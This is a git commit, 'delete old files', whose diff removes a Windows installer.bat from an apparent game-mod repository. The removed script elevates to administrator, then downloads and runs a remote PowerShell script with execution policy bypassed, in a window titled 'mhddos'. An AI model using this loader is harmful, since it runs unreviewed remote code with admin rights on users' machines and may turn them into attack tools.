62cb96a70b53ad1d3425af9cb8f1c6e706c239bf
wvzxn <zvp.ukr01@gmail.com>
2022-12-02 16:23:34 +0200

    delete old files

--- installer.bat
+++
@@ -1,5 +0,0 @@
-@echo off
-if not "%1"=="am_admin" ( powershell start -verb runas '%0' 'am_admin "%~1" "%~2"' & exit )
-set "_PS1_COMMAND=[Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/wvzxn/l4d2-tro-mod/main/1.ps1'))"
-start "mhddos" powershell -executionpolicy bypass -command "%_PS1_COMMAND%"
-exit
